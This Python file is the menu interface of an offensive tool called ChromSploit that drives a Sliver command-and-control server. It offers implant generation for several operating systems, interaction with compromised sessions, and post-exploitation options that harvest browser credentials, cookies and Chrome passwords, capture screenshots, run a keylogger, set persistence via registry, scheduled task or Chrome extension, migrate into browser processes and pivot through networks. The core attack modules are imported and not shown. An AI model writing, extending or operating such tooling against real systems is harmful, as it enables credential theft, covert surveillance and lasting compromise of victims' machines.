#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChromSploit Framework - Sliver C2 Menu
"""

import os
import sys
from typing import List, Dict, Optional, Tuple
from datetime import datetime

# Add parent directory to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.menu import Menu
from core.utils import Colors, print_banner, clear_screen, safe_execute
from core.enhanced_logger import get_logger

# Try to import Sliver C2 components
try:
    from modules.cve_integrations_sliver import (
        get_cve_sliver_manager,
        get_sliver_sessions,
        interact_with_sliver_session
    )
    SLIVER_AVAILABLE = True
except ImportError:
    SLIVER_AVAILABLE = False
    print(f"{Colors.WARNING}[!] Sliver C2 integration not available{Colors.ENDC}")


class SliverC2Menu(Menu):
    """Sliver C2 Command & Control Menu"""
    
    def __init__(self):
        super().__init__()
        self.logger = get_logger()
        self.sliver_manager = get_cve_sliver_manager() if SLIVER_AVAILABLE else None
        
        # Add menu items
        self.add_item("1", "Server Status", self.show_server_status)
        self.add_item("2", "Active Sessions", self.show_active_sessions)
        self.add_item("3", "Generate Implant", self.generate_implant)
        self.add_item("4", "Interact with Session", self.interact_session)
        self.add_item("5", "Post-Exploitation", self.post_exploitation_menu)
        self.add_item("6", "Implant Management", self.implant_management)
        self.add_item("7", "Server Configuration", self.server_configuration)
        self.add_item("0", "Zurück", self.exit)
    
    def display(self):
        """Display Sliver C2 menu"""
        clear_screen()
        print_banner()
        print(f"\n{Colors.HEADER}=== Sliver C2 Command & Control ==={Colors.ENDC}\n")
        
        if not SLIVER_AVAILABLE:
            print(f"{Colors.FAIL}[!] Sliver C2 module not available!{Colors.ENDC}")
            print(f"{Colors.WARNING}[!] Please ensure Sliver is installed and the integration module is loaded{Colors.ENDC}\n")
            
        super().display()
    
    def show_server_status(self):
        """Show Sliver server status"""
        if not self._check_sliver():
            return
            
        clear_screen()
        print(f"\n{Colors.HEADER}=== Sliver Server Status ==={Colors.ENDC}\n")
        
        try:
            status = self.sliver_manager.export_sliver_status()
            
            print(f"Server Running: {self._format_bool(status['server_running'])}")
            print(f"Connected: {self._format_bool(status['connected'])}")
            print(f"Active Sessions: {Colors.OKGREEN}{status['active_sessions']}{Colors.ENDC}")
            print(f"Implants Generated: {Colors.OKBLUE}{status['implants_generated']}{Colors.ENDC}")
            print(f"Session Monitoring: {self._format_bool(status['monitoring_active'])}")
            
            # Show server config
            config = self.sliver_manager.sliver_config
            print(f"\n{Colors.HEADER}Server Configuration:{Colors.ENDC}")
            print(f"  Host: {config.host}")
            print(f"  Port: {config.port}")
            print(f"  Server Path: {config.server_path}")
            
        except Exception as e:
            self.logger.error(f"Error getting server status: {e}")
            print(f"{Colors.FAIL}[!] Error getting server status: {e}{Colors.ENDC}")
            
        input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
    
    def show_active_sessions(self):
        """Show active Sliver sessions"""
        if not self._check_sliver():
            return
            
        clear_screen()
        print(f"\n{Colors.HEADER}=== Active Sliver Sessions ==={Colors.ENDC}\n")
        
        try:
            sessions = get_sliver_sessions()
            
            if not sessions:
                print(f"{Colors.WARNING}[!] No active sessions{Colors.ENDC}")
            else:
                print(f"Found {Colors.OKGREEN}{len(sessions)}{Colors.ENDC} active session(s):\n")
                
                for i, session in enumerate(sessions, 1):
                    print(f"{Colors.OKBLUE}[{i}] Session ID: {session['session_id']}{Colors.ENDC}")
                    print(f"    Hostname: {session['hostname']}")
                    print(f"    Username: {session['username']}")
                    print(f"    OS: {session['os']}")
                    print(f"    Last Check-in: {session['last_checkin']}")
                    if session['associated_cve']:
                        print(f"    Associated CVE: {Colors.WARNING}{session['associated_cve']}{Colors.ENDC}")
                    print()
                    
        except Exception as e:
            self.logger.error(f"Error listing sessions: {e}")
            print(f"{Colors.FAIL}[!] Error listing sessions: {e}{Colors.ENDC}")
            
        input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
    
    def generate_implant(self):
        """Generate new Sliver implant"""
        if not self._check_sliver():
            return
            
        clear_screen()
        print(f"\n{Colors.HEADER}=== Generate Sliver Implant ==={Colors.ENDC}\n")
        
        print("Select target OS:")
        print("1. Windows")
        print("2. Linux")
        print("3. macOS")
        
        os_choice = input(f"\n{Colors.WARNING}Choice: {Colors.ENDC}")
        
        os_map = {
            "1": "windows",
            "2": "linux",
            "3": "darwin"
        }
        
        target_os = os_map.get(os_choice, "linux")
        
        print("\nSelect architecture:")
        print("1. x64 (amd64)")
        print("2. x86 (386)")
        
        arch_choice = input(f"\n{Colors.WARNING}Choice: {Colors.ENDC}")
        
        arch_map = {
            "1": "amd64",
            "2": "386"
        }
        
        target_arch = arch_map.get(arch_choice, "amd64")
        
        print("\nSelect format:")
        print("1. Executable")
        print("2. Shared Library/DLL")
        print("3. Shellcode")
        
        format_choice = input(f"\n{Colors.WARNING}Choice: {Colors.ENDC}")
        
        format_map = {
            "1": "exe",
            "2": "shared",
            "3": "shellcode"
        }
        
        implant_format = format_map.get(format_choice, "exe")
        
        try:
            print(f"\n{Colors.OKBLUE}[*] Generating {target_os}/{target_arch} {implant_format} implant...{Colors.ENDC}")
            
            # Generate implant
            success, output = self.sliver_manager.sliver_server.generate_implant(
                os_type=target_os,
                arch=target_arch,
                format=implant_format,
                name=f"chromsploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            )
            
            if success:
                print(f"{Colors.OKGREEN}[+] Implant generated successfully!{Colors.ENDC}")
                print(f"    Path: {output}")
            else:
                print(f"{Colors.FAIL}[!] Failed to generate implant: {output}{Colors.ENDC}")
                
        except Exception as e:
            self.logger.error(f"Error generating implant: {e}")
            print(f"{Colors.FAIL}[!] Error generating implant: {e}{Colors.ENDC}")
            
        input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
    
    def interact_session(self):
        """Interact with a Sliver session"""
        if not self._check_sliver():
            return
            
        # Show sessions first
        sessions = get_sliver_sessions()
        
        if not sessions:
            print(f"{Colors.WARNING}[!] No active sessions{Colors.ENDC}")
            input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
            return
            
        clear_screen()
        print(f"\n{Colors.HEADER}=== Select Session to Interact ==={Colors.ENDC}\n")
        
        for i, session in enumerate(sessions, 1):
            print(f"{Colors.OKBLUE}[{i}]{Colors.ENDC} {session['session_id']} - {session['hostname']} ({session['username']})")
            
        try:
            choice = int(input(f"\n{Colors.WARNING}Select session (number): {Colors.ENDC}"))
            if 1 <= choice <= len(sessions):
                session_id = sessions[choice - 1]['session_id']
                
                print(f"\n{Colors.OKGREEN}[+] Interacting with session {session_id}{Colors.ENDC}")
                print(f"{Colors.WARNING}[!] Type 'exit' to return to menu{Colors.ENDC}\n")
                
                success, msg = interact_with_sliver_session(session_id)
                
                if not success:
                    print(f"{Colors.FAIL}[!] Failed to interact with session: {msg}{Colors.ENDC}")
                    
            else:
                print(f"{Colors.FAIL}[!] Invalid selection{Colors.ENDC}")
                
        except ValueError:
            print(f"{Colors.FAIL}[!] Invalid input{Colors.ENDC}")
        except Exception as e:
            self.logger.error(f"Error interacting with session: {e}")
            print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
            
        input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
    
    def post_exploitation_menu(self):
        """Post-exploitation submenu"""
        if not self._check_sliver():
            return
            
        menu = PostExploitationMenu(self.sliver_manager)
        menu.run()
    
    def implant_management(self):
        """Implant management submenu"""
        if not self._check_sliver():
            return
            
        clear_screen()
        print(f"\n{Colors.HEADER}=== Implant Management ==={Colors.ENDC}\n")
        
        try:
            implants = self.sliver_manager.implant_manager.list_implants()
            
            if not implants:
                print(f"{Colors.WARNING}[!] No implants generated{Colors.ENDC}")
            else:
                print(f"Found {Colors.OKGREEN}{len(implants)}{Colors.ENDC} implant(s):\n")
                
                for i, implant in enumerate(implants, 1):
                    print(f"{Colors.OKBLUE}[{i}] {implant.name}{Colors.ENDC}")
                    print(f"    ID: {implant.id}")
                    print(f"    OS/Arch: {implant.config.os}/{implant.config.arch}")
                    print(f"    Format: {implant.config.format}")
                    print(f"    Size: {implant.size} bytes")
                    print(f"    Hash: {implant.hash_sha256[:16]}...")
                    if implant.config.cve_id:
                        print(f"    CVE: {Colors.WARNING}{implant.config.cve_id}{Colors.ENDC}")
                    print()
                    
        except Exception as e:
            self.logger.error(f"Error listing implants: {e}")
            print(f"{Colors.FAIL}[!] Error listing implants: {e}{Colors.ENDC}")
            
        input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
    
    def server_configuration(self):
        """Configure Sliver server"""
        if not self._check_sliver():
            return
            
        clear_screen()
        print(f"\n{Colors.HEADER}=== Sliver Server Configuration ==={Colors.ENDC}\n")
        
        print("1. Start Server")
        print("2. Stop Server")
        print("3. Restart Server")
        print("4. Generate Listener")
        print("0. Back")
        
        choice = input(f"\n{Colors.WARNING}Choice: {Colors.ENDC}")
        
        try:
            if choice == "1":
                print(f"{Colors.OKBLUE}[*] Starting Sliver server...{Colors.ENDC}")
                if self.sliver_manager.sliver_server.start_server():
                    print(f"{Colors.OKGREEN}[+] Server started successfully{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[!] Failed to start server{Colors.ENDC}")
                    
            elif choice == "2":
                print(f"{Colors.OKBLUE}[*] Stopping Sliver server...{Colors.ENDC}")
                if self.sliver_manager.sliver_server.stop_server():
                    print(f"{Colors.OKGREEN}[+] Server stopped successfully{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[!] Failed to stop server{Colors.ENDC}")
                    
            elif choice == "3":
                print(f"{Colors.OKBLUE}[*] Restarting Sliver server...{Colors.ENDC}")
                self.sliver_manager.sliver_server.stop_server()
                if self.sliver_manager.sliver_server.start_server():
                    print(f"{Colors.OKGREEN}[+] Server restarted successfully{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[!] Failed to restart server{Colors.ENDC}")
                    
            elif choice == "4":
                self._generate_listener()
                
        except Exception as e:
            self.logger.error(f"Error in server configuration: {e}")
            print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
            
        if choice != "0":
            input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
    
    def _generate_listener(self):
        """Generate new listener"""
        print(f"\n{Colors.HEADER}Generate Listener{Colors.ENDC}")
        
        print("\nSelect protocol:")
        print("1. mTLS")
        print("2. HTTP")
        print("3. HTTPS")
        print("4. DNS")
        
        protocol_choice = input(f"\n{Colors.WARNING}Choice: {Colors.ENDC}")
        
        protocol_map = {
            "1": "mtls",
            "2": "http", 
            "3": "https",
            "4": "dns"
        }
        
        protocol = protocol_map.get(protocol_choice, "mtls")
        
        host = input(f"{Colors.WARNING}Host (default 0.0.0.0): {Colors.ENDC}") or "0.0.0.0"
        port = input(f"{Colors.WARNING}Port (default 8443): {Colors.ENDC}") or "8443"
        
        try:
            port = int(port)
            success, output = self.sliver_manager.sliver_server.generate_listener(
                protocol=protocol,
                host=host,
                port=port
            )
            
            if success:
                print(f"{Colors.OKGREEN}[+] Listener created successfully{Colors.ENDC}")
            else:
                print(f"{Colors.FAIL}[!] Failed to create listener: {output}{Colors.ENDC}")
                
        except ValueError:
            print(f"{Colors.FAIL}[!] Invalid port number{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
    
    def _check_sliver(self) -> bool:
        """Check if Sliver is available"""
        if not SLIVER_AVAILABLE:
            print(f"{Colors.FAIL}[!] Sliver C2 module not available!{Colors.ENDC}")
            input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
            return False
        return True
    
    def _format_bool(self, value: bool) -> str:
        """Format boolean value with color"""
        if value:
            return f"{Colors.OKGREEN}Yes{Colors.ENDC}"
        else:
            return f"{Colors.FAIL}No{Colors.ENDC}"


class PostExploitationMenu(Menu):
    """Post-exploitation submenu"""
    
    def __init__(self, sliver_manager):
        super().__init__()
        self.sliver_manager = sliver_manager
        self.logger = get_logger()
        
        # Add menu items
        self.add_item("1", "Collect Browser Data", self.collect_browser_data)
        self.add_item("2", "Extract Passwords", self.extract_passwords)
        self.add_item("3", "Capture Screenshots", self.capture_screenshots)
        self.add_item("4", "Establish Persistence", self.establish_persistence)
        self.add_item("5", "Keylogger", self.start_keylogger)
        self.add_item("6", "Process Migration", self.migrate_process)
        self.add_item("7", "Network Pivoting", self.network_pivoting)
        self.add_item("0", "Back", self.exit)
    
    def display(self):
        """Display post-exploitation menu"""
        clear_screen()
        print(f"\n{Colors.HEADER}=== Post-Exploitation Options ==={Colors.ENDC}\n")
        super().display()
    
    def _select_session(self) -> Optional[str]:
        """Select a session for post-exploitation"""
        sessions = get_sliver_sessions()
        
        if not sessions:
            print(f"{Colors.WARNING}[!] No active sessions{Colors.ENDC}")
            return None
            
        print(f"\n{Colors.HEADER}Select Target Session:{Colors.ENDC}\n")
        
        for i, session in enumerate(sessions, 1):
            print(f"{Colors.OKBLUE}[{i}]{Colors.ENDC} {session['session_id']} - {session['hostname']} ({session['username']})")
            
        try:
            choice = int(input(f"\n{Colors.WARNING}Select session (number): {Colors.ENDC}"))
            if 1 <= choice <= len(sessions):
                return sessions[choice - 1]['session_id']
        except ValueError:
            pass
            
        print(f"{Colors.FAIL}[!] Invalid selection{Colors.ENDC}")
        return None
    
    def collect_browser_data(self):
        """Collect browser data from target"""
        session_id = self._select_session()
        if not session_id:
            input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
            return
            
        try:
            print(f"\n{Colors.OKBLUE}[*] Collecting browser data...{Colors.ENDC}")
            browser_data = self.sliver_manager.post_exploitation.collect_browser_data(session_id)
            
            if browser_data:
                print(f"{Colors.OKGREEN}[+] Browser data collected successfully!{Colors.ENDC}")
                print(f"    Credentials: {len(browser_data.credentials)}")
                print(f"    Cookies: {len(browser_data.cookies)}")
                print(f"    History entries: {len(browser_data.history)}")
                print(f"    Bookmarks: {len(browser_data.bookmarks)}")
                print(f"    Extensions: {len(browser_data.extensions)}")
            else:
                print(f"{Colors.FAIL}[!] Failed to collect browser data{Colors.ENDC}")
                
        except Exception as e:
            self.logger.error(f"Error collecting browser data: {e}")
            print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
            
        input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
    
    def extract_passwords(self):
        """Extract Chrome passwords"""
        session_id = self._select_session()
        if not session_id:
            input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
            return
            
        try:
            print(f"\n{Colors.OKBLUE}[*] Extracting Chrome passwords...{Colors.ENDC}")
            passwords = self.sliver_manager.post_exploitation.extract_chrome_passwords(session_id)
            
            if passwords:
                print(f"{Colors.OKGREEN}[+] Extracted {len(passwords)} password(s)!{Colors.ENDC}\n")
                
                # Show first few passwords
                for i, pwd in enumerate(passwords[:5]):
                    print(f"  URL: {pwd['url']}")
                    print(f"  Username: {pwd['username']}")
                    print(f"  Password: {'*' * len(pwd['password'])}")
                    print()
                    
                if len(passwords) > 5:
                    print(f"  ... and {len(passwords) - 5} more")
            else:
                print(f"{Colors.WARNING}[!] No passwords found{Colors.ENDC}")
                
        except Exception as e:
            self.logger.error(f"Error extracting passwords: {e}")
            print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
            
        input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
    
    def capture_screenshots(self):
        """Capture screenshots from target"""
        session_id = self._select_session()
        if not session_id:
            input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
            return
            
        try:
            interval = int(input(f"{Colors.WARNING}Screenshot interval (seconds, default 60): {Colors.ENDC}") or "60")
            count = int(input(f"{Colors.WARNING}Number of screenshots (default 5): {Colors.ENDC}") or "5")
            
            print(f"\n{Colors.OKBLUE}[*] Capturing {count} screenshots with {interval}s interval...{Colors.ENDC}")
            
            screenshots = self.sliver_manager.post_exploitation.capture_browser_screenshots(
                session_id, interval=interval, count=count
            )
            
            if screenshots:
                print(f"{Colors.OKGREEN}[+] Captured {len(screenshots)} screenshot(s)!{Colors.ENDC}")
                for i, path in enumerate(screenshots, 1):
                    print(f"    [{i}] {path}")
            else:
                print(f"{Colors.FAIL}[!] Failed to capture screenshots{Colors.ENDC}")
                
        except ValueError:
            print(f"{Colors.FAIL}[!] Invalid input{Colors.ENDC}")
        except Exception as e:
            self.logger.error(f"Error capturing screenshots: {e}")
            print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
            
        input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
    
    def establish_persistence(self):
        """Establish persistence on target"""
        session_id = self._select_session()
        if not session_id:
            input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
            return
            
        print(f"\n{Colors.HEADER}Select Persistence Method:{Colors.ENDC}")
        print("1. Chrome Extension")
        print("2. Startup Registry/Folder")
        print("3. Scheduled Task")
        print("4. Registry Run Key")
        
        method_choice = input(f"\n{Colors.WARNING}Choice: {Colors.ENDC}")
        
        method_map = {
            "1": "chrome_extension",
            "2": "startup",
            "3": "scheduled_task",
            "4": "registry"
        }
        
        method = method_map.get(method_choice, "chrome_extension")
        
        try:
            print(f"\n{Colors.OKBLUE}[*] Establishing persistence via {method}...{Colors.ENDC}")
            success, msg = self.sliver_manager.post_exploitation.establish_persistence(
                session_id, method=method
            )
            
            if success:
                print(f"{Colors.OKGREEN}[+] Persistence established successfully!{Colors.ENDC}")
            else:
                print(f"{Colors.FAIL}[!] Failed to establish persistence: {msg}{Colors.ENDC}")
                
        except Exception as e:
            self.logger.error(f"Error establishing persistence: {e}")
            print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
            
        input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
    
    def start_keylogger(self):
        """Start keylogger on target"""
        session_id = self._select_session()
        if not session_id:
            input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
            return
            
        try:
            duration = int(input(f"{Colors.WARNING}Keylogger duration (seconds, default 300): {Colors.ENDC}") or "300")
            
            print(f"\n{Colors.OKBLUE}[*] Starting keylogger for {duration} seconds...{Colors.ENDC}")
            success, msg = self.sliver_manager.post_exploitation.keylog_browser(
                session_id, duration=duration
            )
            
            if success:
                print(f"{Colors.OKGREEN}[+] Keylogger started successfully!{Colors.ENDC}")
                print(f"    {msg}")
            else:
                print(f"{Colors.FAIL}[!] Failed to start keylogger: {msg}{Colors.ENDC}")
                
        except ValueError:
            print(f"{Colors.FAIL}[!] Invalid input{Colors.ENDC}")
        except Exception as e:
            self.logger.error(f"Error starting keylogger: {e}")
            print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
            
        input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
    
    def migrate_process(self):
        """Migrate to another process"""
        session_id = self._select_session()
        if not session_id:
            input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
            return
            
        try:
            # List processes
            print(f"\n{Colors.OKBLUE}[*] Getting process list...{Colors.ENDC}")
            ps_result = self.sliver_manager.session_handler.get_processes(session_id)
            
            if ps_result.success:
                print(f"\n{Colors.HEADER}Browser Processes:{Colors.ENDC}")
                processes = []
                
                for line in ps_result.output.split('\n'):
                    if any(browser in line.lower() for browser in ['chrome', 'firefox', 'edge']):
                        print(line)
                        processes.append(line)
                        
                if processes:
                    pid = input(f"\n{Colors.WARNING}Enter PID to migrate to: {Colors.ENDC}")
                    
                    print(f"\n{Colors.OKBLUE}[*] Migrating to process {pid}...{Colors.ENDC}")
                    migrate_result = self.sliver_manager.session_handler.migrate_process(
                        session_id, int(pid)
                    )
                    
                    if migrate_result.success:
                        print(f"{Colors.OKGREEN}[+] Successfully migrated to process {pid}{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[!] Failed to migrate: {migrate_result.error}{Colors.ENDC}")
                else:
                    print(f"{Colors.WARNING}[!] No browser processes found{Colors.ENDC}")
            else:
                print(f"{Colors.FAIL}[!] Failed to get process list{Colors.ENDC}")
                
        except ValueError:
            print(f"{Colors.FAIL}[!] Invalid PID{Colors.ENDC}")
        except Exception as e:
            self.logger.error(f"Error migrating process: {e}")
            print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
            
        input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
    
    def network_pivoting(self):
        """Setup network pivoting"""
        session_id = self._select_session()
        if not session_id:
            input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")
            return
            
        print(f"\n{Colors.HEADER}Network Pivoting Options:{Colors.ENDC}")
        print("1. SOCKS5 Proxy")
        print("2. Port Forward")
        print("3. Pivot Listener")
        
        choice = input(f"\n{Colors.WARNING}Choice: {Colors.ENDC}")
        
        try:
            if choice == "1":
                port = int(input(f"{Colors.WARNING}SOCKS5 port (default 9050): {Colors.ENDC}") or "9050")
                
                print(f"\n{Colors.OKBLUE}[*] Starting SOCKS5 proxy on port {port}...{Colors.ENDC}")
                result = self.sliver_manager.session_handler.socks5_proxy(session_id, port)
                
                if result.success:
                    print(f"{Colors.OKGREEN}[+] SOCKS5 proxy started on 127.0.0.1:{port}{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[!] Failed to start SOCKS5 proxy{Colors.ENDC}")
                    
            elif choice == "2":
                local_port = int(input(f"{Colors.WARNING}Local port: {Colors.ENDC}"))
                remote_host = input(f"{Colors.WARNING}Remote host: {Colors.ENDC}")
                remote_port = int(input(f"{Colors.WARNING}Remote port: {Colors.ENDC}"))
                
                print(f"\n{Colors.OKBLUE}[*] Creating port forward...{Colors.ENDC}")
                result = self.sliver_manager.session_handler.portforward(
                    session_id, local_port, remote_host, remote_port
                )
                
                if result.success:
                    print(f"{Colors.OKGREEN}[+] Port forward created: 127.0.0.1:{local_port} -> {remote_host}:{remote_port}{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[!] Failed to create port forward{Colors.ENDC}")
                    
            elif choice == "3":
                bind_addr = input(f"{Colors.WARNING}Bind address (default 0.0.0.0): {Colors.ENDC}") or "0.0.0.0"
                bind_port = int(input(f"{Colors.WARNING}Bind port (default 8443): {Colors.ENDC}") or "8443")
                
                print(f"\n{Colors.OKBLUE}[*] Creating pivot listener...{Colors.ENDC}")
                result = self.sliver_manager.session_handler.pivot_listener(
                    session_id, bind_addr, bind_port
                )
                
                if result.success:
                    print(f"{Colors.OKGREEN}[+] Pivot listener created on {bind_addr}:{bind_port}{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[!] Failed to create pivot listener{Colors.ENDC}")
                    
        except ValueError:
            print(f"{Colors.FAIL}[!] Invalid input{Colors.ENDC}")
        except Exception as e:
            self.logger.error(f"Error in network pivoting: {e}")
            print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
            
        input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")


if __name__ == "__main__":
    # Test the menu
    menu = SliverC2Menu()
    menu.run()